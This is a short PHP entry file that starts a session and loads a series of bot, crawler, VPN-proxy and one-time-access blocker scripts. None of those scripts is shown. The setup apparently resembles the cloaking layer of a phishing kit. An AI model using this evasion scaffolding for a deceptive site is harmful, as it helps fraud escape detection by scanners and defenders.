<?php 
session_start();
require 'main.php';
@require_once "block/_pros.php";
require_once 'blocker.php';
include('detects.php');
include('blockers.php');
include('blockervip32.php');
require_once 'crawlerdetect.php';

if(filesize("config/antibot.ini") == 1) {
}else{
require_once("antibot.php");
}
if($onetime == "on") {
	require_once 'onetime.php';
}
if($block_vpn == "on") {
    require_once 'proxyblock.php';
}
?>